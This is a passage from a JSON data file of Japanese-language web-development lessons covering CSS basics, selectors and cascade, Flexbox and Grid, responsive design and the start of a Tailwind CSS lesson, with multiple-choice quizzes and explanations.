に入って履歴やログに残る。`post` に |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`<input id=\"mail\" name=\"email\">` を送信したとき、サーバーに届く名前は？",
        "choices": [
         "`mail`",
         "`email`",
         "`input`"
        ],
        "answer": 1,
        "explain": "サーバーに届くのは `name` の値です。`id` はページの中で label と結び付けたり、CSS や JavaScript から探したりするための名前です。"
       },
       {
        "question": "フォームの中に `<button>リセット</button>` と書いたら、押すたびにページが再読み込みされた。原因は？",
        "choices": [
         "type を書かない button は送信ボタンになるから",
         "button はフォームの中に書けないから",
         "リセットという文字が特別な意味を持つから"
        ],
        "answer": 0,
        "explain": "送信しないボタンには `type=\"button\"` を書きます。"
       },
       {
        "question": "`<input type=\"number\" min=\"1\" max=\"10\" required>` があるので、サーバーでの数値チェックは不要？",
        "choices": [
         "不要。ブラウザが 1〜10 以外を送らせない",
         "必要。ブラウザのチェックは開発者ツールや直接のリクエストで飛ばせる",
         "required があるときだけ不要"
        ],
        "answer": 1,
        "explain": "ブラウザのチェックは使いやすさのためのものです。守るためのチェックはサーバーで行います。"
       }
      ]
     ],
     "id": "02-forms"
    },
    {
     "title": "CSS の基本 ― クラス・ID とボックスモデル",
     "level": 1,
     "minutes": 16,
     "concepts": [
      "dom_ui",
      "reading"
     ],
     "summary": "CSS の書き方（セレクタ・プロパティ・値）、class と id の使い分け、すべての要素が「箱」であるボックスモデル。width: 200px が 250px になる理由と box-sizing。",
     "body": "## このレッスンのゴール\n\n- CSS の 1 つのルールを「セレクタ・プロパティ・値」に分けて読める\n- `class` と `id` の違いと、どちらを使うべきかが分かる\n- ボックスモデル（中身・padding・border・margin）を説明でき、`box-sizing: border-box` の意味が分かる\n\n## CSS の形\n\n```css\n.note {\n  color: blue;\n  font-size: 18px;\n}\n```\n\n| 部分 | 意味 |\n|---|---|\n| `.note` | **セレクタ**：どの要素に（class が note の要素に） |\n| `color` | **プロパティ**：何を（文字の色を） |\n| `blue` | **値**：どうする（青に） |\n| `{ ... }` | 1 つのルールのまとまり。`;` で区切って複数書ける |\n\nPython で言うと、`{\"color\": \"blue\", \"font-size\": \"18px\"}` という辞書を、セレクタに合う要素全部に当てはめるイメージです。\n\n### CSS を書く 3 つの場所\n\n| 場所 | 例 | 使いどころ |\n|---|---|---|\n| 別のファイル | `<link rel=\"stylesheet\" href=\"style.css\">` | **ふつうはこれ**。このサイトも `site/style.css` |\n| `<style>` タグ | `<head>` の中に `<style> ... </style>` | 1 ページだけの小さな例 |\n| `style` 属性 | `<p style=\"color: red\">` | その要素だけ。増えると直すのが大変 |\n\n## class と id\n\n```html\n<p class=\"note\">メモ 1</p>\n<p class=\"note important\">メモ 2</p>\n<p id=\"intro\">はじめに</p>\n```\n\n```css\n.note { color: blue; }         /* . で class */\n.important { font-weight: bold; }\n#intro { font-size: 20px; }     /* # で id */\n```\n\n| | class | id |\n|---|---|---|\n| CSS での書き方 | `.note` | `#intro` |\n| ページの中に | **何個あってもよい** | **1 つだけ** |\n| 1 つの要素に | スペース区切りで複数付けられる（`note important`） | 1 つ |\n| 主な使い道 | **見た目**（CSS） | ページ内リンク（`href=\"#intro\"`）、JavaScript で 1 つを探す（`getElementById`） |\n\n**見た目には class を使う** のが基本です。id は強すぎる（次のレッスン）ので、CSS ではあまり使いません。\n\n## よく使うプロパティ\n\n| プロパティ | 例 | 意味 |\n|---|---|---|\n| `color` | `#333`、`rgb(51, 51, 51)` | 文字の色（コンピュータの基礎コースの 16 進数） |\n| `background` | `#f5f5f5` | 背景 |\n| `font-size` | `16px`、`1.2rem` | 文字の大きさ（単位はレッスン 6） |\n| `font-weight` | `bold`、`700` | 文字の太さ |\n| `text-align` | `center` | 文字の左右のそろえ |\n| `width` / `height` | `200px`、`50%` | 幅・高さ |\n| `display` | `block`、`inline`、`flex`、`grid`、`none` | 並び方（`none` は非表示） |\n\n### block と inline\n\n| | block | inline |\n|---|---|---|\n| 例 | `div`・`p`・`h1`・`ul`・`section` | `span`・`a`・`strong`・`img` |\n| 並び方 | **縦に積まれる**（横幅いっぱいを使う） | **文の中で横に流れる** |\n| width・height | 効く | 効かない（`img` は例外） |\n\n## ボックスモデル：すべての要素は箱\n\nどの要素も、内側から **中身 → padding（内側の余白）→ border（枠線）→ margin（外側の余白）** の 4 層の箱になっています。\n\n```text\n┌───────────── margin（外側の余白。隣の箱との距離）────────────┐\n│  ┏━━━━━━━━━━━ border（枠線）━━━━━━━━━━━━┓                    │\n│  ┃  ┌──────── padding（内側の余白）──┐   ┃                    │\n│  ┃  │         中身（width）          │   ┃                    │\n│  ┃  └───────────────────────────────┘   ┃                    │\n│  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                    │\n└──────────────────────────────────────────────────────────────┘\n```\n\n```css\n.box1 {\n  width: 200px;\n  padding: 20px;\n  border: 5px solid;\n  margin: 10px;\n}\n```\n\nブラウザで実際の幅を測ると、**250px** になりました。\n\n```text\n200（中身）＋ 20 × 2（左右の padding）＋ 5 × 2（左右の border）＝ 250px\n```\n\n`width` は **中身の幅だけ** を指していて、padding と border は外に足されるからです（margin は箱の外の余白なので、幅には入りません）。\n\n### box-sizing: border-box\n\n```css\n.box2 {\n  width: 200px;\n  padding: 20px;\n  border: 5px solid;\n  box-sizing: border-box;   /* width に padding と border も含める */\n}\n```\n\nこちらは測ると **200px** でした。`border-box` にすると、`width: 200px` が「枠線まで含めて 200px」の意味になり、padding を変えても全体の幅が変わりません。\n直感に合うので、多くのサイトが最初にこう書いています（Tailwind CSS なども最初からこの設定です）。\n\n```css\n*, *::before, *::after { box-sizing: border-box; }\n```\n\n### 余白の書き方\n\n```css\npadding: 10px;               /* 上下左右すべて 10px */\npadding: 10px 20px;          /* 上下 10px、左右 20px */\npadding: 10px 20px 5px 0;    /* 上 右 下 左（時計回り） */\nmargin: 0 auto;              /* 上下 0、左右は自動 → 幅のある block 要素を横の中央に */\npadding-top: 10px;           /* 1 方向だけ */\n```\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `* { margin: 0; padding: 0; box-sizing: border-box; }` | ブラウザの初期の余白を消し、幅の計算を分かりやすくする「リセット」。よくある書き出し |\n| `#header { ... }` が CSS にたくさん | ⚠️ id は強すぎて上書きしにくい。class に |\n| `style=\"...\"` があちこちに | ⚠️ 直すときに探しにくい。class にまとめる |\n| `display: none` | 非表示。画面からも読み上げからも消える |\n| `width: 100%` ＋ `padding` で、はみ出して横スクロールが出る | `box-sizing: border-box` が無いと、100% ＋ padding になる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`.note { color: blue; }` の `.note` は何？",
        "choices": [
         "class が note の要素を選ぶセレクタ",
         "id が note の要素を選ぶセレクタ",
         "note というタグ"
        ],
        "answer": 0,
        "explain": "`.` は class、`#` は id です。セレクタは「どの要素に当てはめるか」を決めます。"
       },
       {
        "question": "`width: 200px; padding: 20px; border: 5px solid;`（box-sizing の指定なし）の要素の、見た目の幅は？",
        "choices": [
         "200px",
         "220px",
         "250px"
        ],
        "answer": 2,
        "explain": "初期設定では width は中身だけの幅なので、左右の padding（40px）と border（10px）が足されて 250px になります。"
       },
       {
        "question": "ページの中に何個あってもよく、見た目を付けるのに向いているのは？",
        "choices": [
         "id",
         "class",
         "name"
        ],
        "answer": 1,
        "explain": "id はページに 1 つだけの名前です。見た目には、いくつでも使い回せる class を使います。"
       }
      ]
     ],
     "id": "03-css-basics"
    },
    {
     "title": "セレクタとカスケード ― どの指定が勝つのか",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "dom_ui",
      "reading"
     ],
     "summary": "子孫・子・疑似クラスなどのセレクタと、同じ要素に複数のルールが当たったときの勝ち負け（詳細度・後勝ち・!important・インライン）、継承。「CSS が効かない」の原因を順番に探せるようになる。",
     "body": "## このレッスンのゴール\n\n- よく使うセレクタ（子孫・子・複数・疑似クラス）を読める\n- 同じ要素に複数のルールが当たったとき、どれが勝つかを「詳細度」で説明できる\n- 「CSS が効かない」ときに、疑う順番が分かる\n\n## よく使うセレクタ\n\n| セレクタ | 例 | 選ぶもの |\n|---|---|---|\n| タグ | `p` | すべての `<p>` |\n| class | `.note` | class に note を含む要素 |\n| id | `#intro` | id が intro の要素 |\n| 組み合わせ（スペース無し） | `p.note` | `<p>` で、かつ class が note |\n| **子孫**（スペース） | `.card p` | `.card` の **中のどこか** にある `<p>` |\n| **子**（`>`） | `.menu > li` | `.menu` の **すぐ下** の `<li>`（孫は含まない） |\n| 複数（`,`） | `h1, h2` | `h1` と `h2` の両方 |\n| 属性 | `input[type=\"email\"]` | type が email の input |\n| すべて | `*` | すべての要素 |\n\n### 疑似クラス：状態で選ぶ\n\n| セレクタ | 選ぶもの |\n|---|---|\n| `a:hover` | マウスが乗っているリンク |\n| `button:focus-visible` | キーボードで選ばれているボタン |\n| `input:disabled` | 使えない状態の入力欄 |\n| `li:first-child` / `li:last-child` | 最初／最後の `<li>` |\n| `li:nth-child(2n)` | 偶数番目の `<li>`（表のしま模様など） |\n| `p:not(.note)` | class が note **ではない** `<p>` |\n\n`::before` / `::after`（コロン 2 つ）は **疑似要素** と呼び、要素の前後に飾りを足します（`content: \"★\"` など）。\n\nJavaScript の `document.querySelector(\".card p\")` も、**同じセレクタの書き方** です。CSS のセレクタが読めれば、JavaScript で要素を探すコードも読めます。\n\n## カスケード：ルールがぶつかったら\n\n1 つの要素に、色を指定するルールが何個も当たることがあります。\n\n```css\np        { color: black; }\n.note    { color: blue; }\np.note   { color: purple; }\n#first   { color: red; }\n.card p  { color: green; }\n```\n\n```html\n<p id=\"a\">a</p>\n<p class=\"note\" id=\"b\">b</p>\n<p class=\"note\" id=\"first\">c</p>\n<div class=\"card\"><p class=\"note\" id=\"d\">d</p></div>\n```\n\nブラウザで実際の色を調べた結果です。\n\n| 要素 | 当たるルール | 結果 |\n|---|---|---|\n| a | `p` だけ | 黒 |\n| b | `p`・`.note`・`p.note` | **紫**（`p.note`） |\n| c | `p`・`.note`・`p.note`・`#first` | **赤**（`#first`） |\n| d | `p`・`.note`・`p.note`・`.card p` | **紫**（`p.note`。`.card p` と同点で、後に書かれた方） |\n\nこの勝ち負けを決める仕組みを **カスケード** と呼びます。\n\n### 詳細度：セレクタの強さ\n\nセレクタの強さ（**詳細度**）は、次の 3 つの数を数えて、**左の桁から** 比べます。\n\n| 数えるもの | 例 |\n|---|---|\n| ① id の数 | `#first` |\n| ② class・属性・疑似クラスの数 | `.note`、`[type=\"email\"]`、`:hover` |\n| ③ タグ・疑似要素の数 | `p`、`::before` |\n\n| セレクタ | 詳細度（①, ②, ③） |\n|---|---|\n| `p` | 0, 0, 1 |\n| `.note` | 0, 1, 0 |\n| `p.note` | 0, 1, 1 |\n| `.card p` | 0, 1, 1 |\n| `#first` | 1, 0, 0 |\n\n- `.note`（0,1,0）は `p`（0,0,1）より強い：② の桁で勝つ\n- `#first`（1,0,0）は、class をいくつ重ねても勝てない：① の桁で勝つ\n- `p.note` と `.card p` は同点（0,1,1）→ **後に書いた方が勝つ**（上の例では `.card p` が先、`p.note` が後なので紫）\n\n### もっと強いもの\n\n```html\n<p class=\"note imp\" style=\"color: pink\">e</p>\n```\n\n```css\n.imp { color: orange !important; }\n```\n\n結果は **オレンジ** でした。\n\n| 強さ（弱い → 強い） | |\n|---|---|\n| ふつうのルール（詳細度 → 後勝ち） | |\n| `style=\"...\"`（インラインスタイル） | どのセレクタより強い |\n| `!important` | インラインスタイルよりも強い |\n\n⚠️ `!important` は「とにかく勝たせる」ための非常手段です。使うと、あとでそれを上書きするためにまた `!important` が必要になり、**どんどん直しにくく** なります。AI が「効かないので `!important` を付けました」と言ってきたら、本当の原因（詳細度か順番）を探しましょう。\n\n## 継承：親から引き継ぐもの\n\n```css\n.parent { color: teal; font-size: 20px; border: 1px solid; }\n```\n\n```html\n<div class=\"parent\">\n  <span>子の span</span>\n  <a href=\"#\">リンク</a>\n</div>\n```\n\nブラウザで調べると、`span` は **teal（青緑）** になりましたが、`border` は付きませんでした。`a` はブラウザの初期のリンクの色（青）のままでした。\n\n| 引き継がれる（継承する） | 引き継がれない |\n|---|---|\n| `color`・`font-size`・`font-family`・`line-height`・`text-align` など、**文字に関するもの** | `border`・`margin`・`padding`・`width`・`background` など、**箱に関するもの** |\n\nリンクの色が変わらなかったのは、ブラウザが `a` に最初から色を指定しているからです（継承より、要素に直接当たるルールが優先）。リンクの色を変えたいときは `a { color: inherit; }` や `.parent a { ... }` と書きます。\n\n## 「CSS が効かない」ときの探し方\n\nブラウザで右クリック →「検証」（開発者ツール）を開き、要素を選ぶと、**当たっているルールと、負けて線で消されたルール** が一覧で見えます。\n\n| 順番 | 疑うこと |\n|---|---|\n| ① | セレクタが合っているか（class 名の打ち間違い、`.` の付け忘れ） |\n| ② | CSS のファイルが読み込まれているか（`<link>` のパス） |\n| ③ | もっと強いルール（詳細度・後勝ち・インライン・`!important`）に負けていないか |\n| ④ | そのプロパティが効く要素か（inline 要素の `width` など。レッスン 3） |\n| ⑤ | 書き方の間違い（`;` 忘れで、次の行まで無効になっている） |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `!important` がたくさん | ⚠️ 詳細度の争いが起きている。class を整理する |\n| `#main .content div ul li a span` のような長いセレクタ | ⚠️ 強すぎて上書きしにくく、HTML を少し変えると効かなくなる |\n| `.btn-primary:hover` | ✅ class ＋ 状態。よくある形 |\n| `:focus { outline: none; }` | ⚠️ キーボードで操作している人が、今どこを選んでいるか分からなくなる。消すなら代わりの見た目を |\n| React の `className=\"note\"` | HTML の `class` と同じ（JavaScript では `class` が予約語なので `className`） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`.card p` が選ぶのは？",
        "choices": [
         "class が card の `<p>`",
         "class が card の要素の中のどこかにある `<p>`",
         "class が card の要素のすぐ下の `<p>` だけ"
        ],
        "answer": 1,
        "explain": "スペースは「子孫」で、中のどこにあっても選びます。すぐ下だけなら `.card > p` です。"
       },
       {
        "question": "`.note { color: blue; }` と `#first { color: red; }` が両方当たる要素の色は？（`#first` が先に書かれていても）",
        "choices": [
         "赤。id のセレクタは class より詳細度が高い",
         "青。後に書かれた方が勝つ",
         "紫。2 つの色が混ざる"
        ],
        "answer": 0,
        "explain": "後勝ちは詳細度が同じときだけです。id（1,0,0）は class（0,1,0）より常に強いです。"
       },
       {
        "question": "親に `color` と `border` を指定したとき、子に引き継がれるのは？",
        "choices": [
         "両方",
         "`color` だけ",
         "`border` だけ"
        ],
        "answer": 1,
        "explain": "文字に関するもの（color・font-size など）は継承されますが、箱に関するもの（border・margin など）は継承されません。"
       }
      ]
     ],
     "id": "04-selectors-cascade"
    },
    {
     "title": "Flexbox と Grid ― 並べ方のレイアウト",
     "level": 2,
     "minutes": 20,
     "concepts": [
      "dom_ui",
      "collections"
     ],
     "summary": "1 列に並べる Flexbox と、縦横のマス目に並べる Grid。flex: 1・justify-content・align-items・gap・fr・repeat(auto-fill, minmax()) を、ブラウザで測った幅で読む。",
     "body": "## このレッスンのゴール\n\n- Flexbox の「主軸と交差軸」を説明し、`justify-content`・`align-items`・`flex: 1` を読める\n- Grid の `grid-template-columns`・`fr`・`gap` を読める\n- Flexbox と Grid のどちらを使う場面かを判断できる\n\n## Flexbox：1 列に並べる\n\n```css\n.row {\n  display: flex;      /* 子どもを横に並べる */\n  gap: 10px;          /* 子どものあいだの隙間 */\n  width: 600px;\n}\n.grow { flex: 1; }    /* 残りの幅を全部もらう */\n```\n\n```html\n<div class=\"row\">\n  <div style=\"width: 100px\">1</div>\n  <div class=\"grow\">2</div>\n  <div style=\"width: 100px\">3</div>\n</div>\n```\n\nブラウザで測った幅は、**100px・380px・100px** でした。\n\n```text\n600（全体）− 100 − 100（固定の 2 つ）− 10 × 2（隙間 2 か所）＝ 380px ← flex: 1 の要素がもらった\n```\n\n`display: flex` を付けるのは **親** で、並べられるのは **すぐ下の子ども** です。\n\n### 主軸と交差軸\n\n| | 意味 | 初期値 | そろえるプロパティ |\n|---|---|---|---|\n| **主軸** | 並ぶ方向 | 横（左 → 右） | `justify-content` |\n| **交差軸** | 主軸と直角の方向 | 縦 | `align-items` |\n\n`flex-direction: column` にすると、主軸が縦になり、`justify-content` が縦方向、`align-items` が横方向のそろえになります（ここで混乱しやすい）。\n\n| `justify-content` | 並び方 |\n|---|---|\n| `flex-start`（初期値） | 先頭に詰める |\n| `center` | 中央に集める |\n| `flex-end` | 末尾に詰める |\n| `space-between` | 両端に寄せて、残りを均等に間に |\n\n| `align-items` | 交差軸のそろえ |\n|---|---|\n| `stretch`（初期値） | 高さいっぱいに伸ばす |\n| `center` | 中央 |\n| `flex-start` / `flex-end` | 上／下 |\n\n### 定番：上下左右の中央\n\n```css\n.center {\n  display: flex;\n  justify-content: center;   /* 横の中央 */\n  align-items: center;       /* 縦の中央 */\n  height: 100px;\n}\n```\n\n幅 300px・高さ 100px の箱で測ると、中の文字の **左右の余白が同じ（134px ずつ）、上下も同じ（40px ずつ）** で、ちょうど真ん中になっていました。昔の CSS では難しかった「縦の中央」が、2 行で書けます。\n\n### よく使うその他の指定\n\n| プロパティ | 意味 |\n|---|---|\n| `flex-wrap: wrap` | 入りきらないと次の行へ折り返す |\n| `flex: 1` | 残りの場所を分け合う（`flex: 2` の要素は 2 倍もらう） |\n| `flex-shrink: 0` | 縮ませない（アイコンなどがつぶれないように） |\n| `gap` | 子どものあいだの隙間（margin を個別に付けるより簡単） |\n\n## Grid：縦横のマス目に並べる\n\n```css\n.grid {\n  display: grid;\n  grid-template-columns: 1fr 2fr 1fr;   /* 3 列。真ん中だけ 2 倍 */\n  gap: 10px;\n  width: 420px;\n}\n```\n\n測った幅は **100px・200px・100px** でした。\n\n```text\n420 − 10 × 2（隙間）＝ 400px を、1 : 2 : 1 に分ける → 100・200・100\n```\n\n`fr` は「残りの場所の **取り分**（fraction）」という単位です。\n\n| 書き方 | 意味 |\n|---|---|\n| `grid-template-columns: 200px 1fr` | 左は 200px 固定、右は残り全部（サイドバーと本文） |\n| `repeat(3, 1fr)` | `1fr 1fr 1fr` と同じ |\n| `grid-template-rows` | 行の高さ |\n| `grid-column: span 2` | 子どもの側で「2 列分使う」 |\n\n### 定番：画面の幅に合わせて列の数が変わるカード\n\n```css\n.cards {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));\n  gap: 10px;\n}\n```\n\n| 部分 | 意味 |\n|---|---|\n| `minmax(150px, 1fr)` | 1 列は **最低 150px**、余ったら均等に広げる |\n| `repeat(auto-fill, ...)` | 入るだけの数の列を作る |\n\nカード 5 枚で試すと、**画面の幅 800px では 1 行に 4 枚、375px（スマホ）では 2 枚** になりました。メディアクエリ（次のレッスン）を書かなくても、列の数が自動で変わります。\n\nこのサイトの `site/style.css` にも、まったく同じ形があります。コースやレッスンのカードの一覧です。\n\n```css\n.cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 12px; }\n```\n\n## どちらを使う？\n\n| | Flexbox | Grid |\n|---|---|---|\n| 得意 | **1 方向**（横 1 列・縦 1 列）に並べる | **縦と横の両方** をそろえる |\n| 例 | ナビゲーションのメニュー、ボタンを横に並べる、中央寄せ、カードの中身 | ページ全体の枠組み、カードの一覧、表のようなレイアウト |\n| 決め方 | 中身の大きさに合わせて並べたい | 先にマス目を決めて、そこにはめたい |\n\n迷ったら、**1 列なら Flexbox、マス目なら Grid**。1 つのページの中で両方を組み合わせるのが普通です（ページの枠は Grid、ヘッダーの中は Flexbox など）。\n\n## 他の言語・フレームワークでは\n\nPython で画面を作る道具や、スマホアプリの画面の作り方にも、同じ考え方が出てきます。\n\n| | 横に並べる | 縦に並べる |\n|---|---|---|\n| CSS | `display: flex` | `flex-direction: column` |\n| Tailwind CSS（レッスン 7） | `flex` | `flex flex-col` |\n| SwiftUI（iPhone） | `HStack` | `VStack` |\n| Jetpack Compose（Android） | `Row` | `Column` |\n| Flutter | `Row` | `Column` |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `display: flex; justify-content: space-between; align-items: center;` | ヘッダーの定番。左にロゴ、右にメニュー、縦は中央 |\n| `display: flex; flex-direction: column; gap: 1rem;` | 縦に並べて隙間をそろえる（フォームなど） |\n| `grid-template-columns: repeat(auto-fill, minmax(250px, 1fr))` | 幅に合わせて列の数が変わるカード一覧 |\n| `min-height: 100vh; display: flex; flex-direction: column;` ＋ `main { flex: 1 }` | 中身が少なくてもフッターを画面の下に置く |\n| `float: left` / `clearfix` | 古いレイアウトの方法。今は Flexbox か Grid |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "幅 600px の `display: flex; gap: 10px;` の中に、100px・`flex: 1`・100px の 3 つがある。`flex: 1` の要素の幅は？",
        "choices": [
         "400px",
         "380px",
         "200px"
        ],
        "answer": 1,
        "explain": "600 から固定の 200 と、隙間 2 か所の 20 を引いた 380px が残り、flex: 1 の要素がそれをもらいます（ブラウザで測った値）。"
       },
       {
        "question": "Flexbox で、横に並んだ子どもを **縦方向に** 中央にそろえるのは？（flex-direction は初期値）",
        "choices": [
         "`justify-content: center`",
         "`align-items: center`",
         "`text-align: center`"
        ],
        "answer": 1,
        "explain": "初期値では主軸が横なので、justify-content は横、align-items は縦（交差軸）のそろえです。"
       },
       {
        "question": "`grid-template-columns: 1fr 2fr 1fr; gap: 10px; width: 420px;` の真ん中の列の幅は？",
        "choices": [
         "210px",
         "200px",
         "140px"
        ],
        "answer": 1,
        "explain": "隙間 20px を引いた 400px を 1:2:1 に分けるので、真ん中は 200px です。"
       }
      ]
     ],
     "id": "05-flexbox-grid"
    },
    {
     "title": "レスポンシブ ― スマホでも PC でも見やすく",
     "level": 2,
     "minutes": 16,
     "concepts": [
      "dom_ui"
     ],
     "summary": "viewport の meta タグ、メディアクエリ、モバイルファースト、px・%・rem・em・vw の使い分け。画像のはみ出しと横スクロールの直し方。",
     "body": "## このレッスンのゴール\n\n- `<meta name=\"viewport\">` が何のためにあるか説明できる\n- メディアクエリ（`@media`）を読み、どの画面幅で何が変わるか分かる\n- 単位（px・%・rem・em・vw）を使い分けられる\n\n**レスポンシブ** とは、1 つの HTML と CSS で、スマホ・タブレット・PC のどの画面幅でも見やすく表示することです。\n\n## まず viewport の meta タグ\n\n```html\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n```\n\nこれが無いと、スマホのブラウザは「PC 用のページだろう」と考えて、**幅 980px くらいの画面として表示し、全体を縮小** します。文字が豆粒のように小さくなります。\nこの 1 行で「画面の幅 ＝ スマホの本当の幅（375px など）で表示して」と伝えます。レッスン 1 の基本の形に入っていたのはこのためです。\n\n## メディアクエリ：画面の幅で CSS を変える\n\n```css\n.resp { color: black; }\n\n@media (min-width: 768px) {     /* 画面の幅が 768px 以上のときだけ */\n  .resp { color: red; }\n}\n```\n\nブラウザの幅を変えて確かめると、**幅 800px では赤、375px では黒** になりました。\n\n| 書き方 | 意味 |\n|---|---|\n| `@media (min-width: 768px)` | 768px **以上** のとき |\n| `@media (max-width: 767px)` | 767px **以下** のとき |\n| `@media (prefers-color-scheme: dark)` | 利用者がダークモードにしているとき |\n| `@media print` | 印刷するとき |\n\nPython で言うと、`if screen_width >= 768:` の中にだけ書いた CSS、というイメージです。\n\n### モバイルファースト\n\n```css\n/* まずスマホ用（何も条件を付けない） */\n.layout { display: block; }\n\n/* 広い画面のときだけ、横に並べる */\n@media (min-width: 768px) {\n  .layout { display: grid; grid-template-columns: 240px 1fr; }\n}\n```\n\n**スマホ用を先に書き、`min-width` で広い画面の分を足していく** 書き方を、モバイルファーストと呼びます。スマホの CSS が単純になるので、今はこちらが主流です。\n\n| よく使う区切り（目安） | |\n|---|---|\n| 〜 639px | スマホ |\n| 640px 〜 | 大きめのスマホ・小さいタブレット |\n| 768px 〜 | タブレット |\n| 1024px 〜 | ノート PC |\n| 1280px 〜 | 大きな画面 |\n\n（Tailwind CSS の `sm:`・`md:`・`lg:`・`xl:` がこの区切りです。レッスン 7）\n\n## 単位の使い分け\n\n| 単位 | 意味 | 使いどころ |\n|---|---|---|\n| `px` | 画面の点（ピクセル）の数 | 枠線の太さなど、変わってほしくないもの |\n| `%` | 親の大きさに対する割合 | 幅（`width: 50%`） |\n| `rem` | **ページの基準の文字の大きさ**（ふつう 16px）の何倍か | **文字の大きさ・余白**（おすすめ） |\n| `em` | **親の文字の大きさ** の何倍か | ボタンの中の余白など、文字に合わせたいもの |\n| `vw` / `vh` | 画面の幅／高さの 1% | 画面いっぱいの背景（`min-height: 100vh`） |\n\n親の文字の大きさを 20px にして、子に `1.5em` と `1.5rem` を付けて測りました。\n\n```text\nfont-size: 1.5em  → 30px（親の 20px × 1.5）\nfont-size: 1.5rem → 24px（基準の 16px × 1.5。親は関係ない）\n```\n\n`em` は **入れ子になるほど掛け算で大きくなる** ので、意図しない大きさになりがちです。文字の大きさには `rem` を使うのが無難です。\nまた、`rem` で書いておくと、利用者がブラウザの設定で文字を大きくしたときに、ページ全体が一緒に大きくなります。\n\n## よくある崩れと直し方\n\n| 症状 | よくある原因 | 直し方 |\n|---|---|---|\n| スマホで横スクロールが出る | 幅を `px` で固定した要素がある（`width: 800px`） | `max-width: 100%`、または `%` や Grid に |\n| 画像がはみ出す | 画像が元の大きさで表示されている | `img { max-width: 100%; height: auto; }` |\n| 長い URL が折り返されずにはみ出す | 単語の途中で改行できない | `overflow-wrap: anywhere;` |\n| `width: 100%` ＋ padding ではみ出す | box-sizing（レッスン 3） | `box-sizing: border-box` |\n| スマホで文字が小さすぎる | viewport の meta タグが無い | レッスンの最初の 1 行を入れる |\n| ボタンが小さくて押しにくい | 押せる範囲が狭い | 高さ 44px 前後を目安に、padding を大きく |\n\n## 確かめ方\n\nブラウザの開発者ツール（F12）の左上の **スマホとタブレットの形のボタン** を押すと、iPhone などの幅で表示できます。AI に作ってもらったページは、**PC の幅だけでなく、スマホの幅でも必ず見てみましょう**。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `@media (max-width: 768px) { ... }` | 768px **以下**（スマホ・タブレット）向けの上書き。PC 用が先に書かれている（デスクトップファースト） |\n| `@media (min-width: 768px)` | 768px 以上向け。モバイルファースト |\n| `width: 1200px` | ⚠️ スマホではみ出す。`max-width: 1200px; margin: 0 auto;` なら OK（広い画面では 1200px で中央寄せ、狭い画面では画面いっぱい） |\n| `font-size: 14px` が全部 px | 利用者の文字の大きさの設定が効かない。`rem` だと親切 |\n| `height: 100vh` | スマホではアドレスバーの分だけはみ出すことがある。`100dvh`（動的な高さ）を使うコードも増えている |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">` が無いと、スマホでどうなる？",
        "choices": [
         "表示されない",
         "PC 用の広い画面として表示され、全体が縮小されて文字がとても小さくなる",
         "自動でスマホ用のデザインになる"
        ],
        "answer": 1,
        "explain": "スマホのブラウザは、指示が無いと PC 用のページとして広い幅で表示します。この 1 行で本当の画面幅で表示させます。"
       },
       {
        "question": "`@media (min-width: 768px) { .menu { display: flex; } }` の意味は？",
        "choices": [
         "画面の幅が 768px 以上のときだけ、.menu を横並びにする",
         "画面の幅が 768px 以下のときだけ、横並びにする",
         "768 個のメニューを並べる"
        ],
        "answer": 0,
        "explain": "min-width は「この幅以上」です。スマホ用を先に書き、広い画面の分を足すモバイルファーストの書き方です。"
       },
       {
        "question": "親の文字の大きさが 20px のとき、子の `font-size: 1.5rem` は何 px？（ページの基準は 16px）",
        "choices": [
         "30px",
         "24px",
         "20px"
        ],
        "answer": 1,
        "explain": "rem はページの基準（16px）の何倍か、なので親は関係なく 24px です。em なら親の 20px × 1.5 = 30px になります。"
       }
      ]
     ],
     "id": "06-responsive"
    },
    {
     "title": "Tailwind CSS を読む ― class だらけの HTML の正体",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "dom_ui",
      "reading",
      "ai_coding",
      "tooling"
     ],
     "summary": "AI が書く画面のコードによく出てくる Tailwind CSS。`px-4 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 md:px-6` を、実際に生成された CSS と見比べて 1 つずつ読む。数字の意味、hover:・md:・dark: の前置き、よくある組み合わせ。",
     "body": "## このレッスンのゴール\n\n- Tailwind CSS の class 名が、どんな CSS になるのかを読める\n- 数字（`p-4`・`gap-6`）の大きさと、`hover:`・`md:`・`dark:` の意味が分かる\n- AI の画面のコードを見て、レイアウト（Flexbox・Grid・レスポンシブ）を説明できる\n\n## AI の画面のコードは、だいたいこうなっている\n\nReact などで AI に画面を作ってもらうと、こんなコードがよく出てきます。\n\n```html\n<button class=\"px-4 py-2 rounded-lg bg-blue-600 text-white font-bold hover:bg-blue-700 md:px-6 disabled:opacity-50\">\n  保存\n</button>\n```\n\nCSS のファイルはほとんど無く、**class にたくさんの短い名前が並んでいる** のが特徴です。これが **Tailwind CSS** です。\n1 つの class が 1 つの小さな CSS に対応していて、それを組み合わせて見た目を作ります（「ユーティリティファースト」と呼びます）。React では `class` の代わりに `className=\"...\"` と書きます。\n\n## 実際に生成された CSS と見比べる\n\nTailwind は、HTML に出てくる class 名を探して、**使われているものだけの CSS を自動で作ります**。上のボタンの HTML から、実際に Tailwind（v4.3）で CSS を生成してみました。\n\n| class | 生成された CSS | 読み方 |\n|---|---|---|\n| `px-4` | `padding-inline: calc(var(--spacing) * 4);` | 左右（x）の padding を 4 単位 |\n| `py-2` | `padding-block: calc(var(--spacing) * 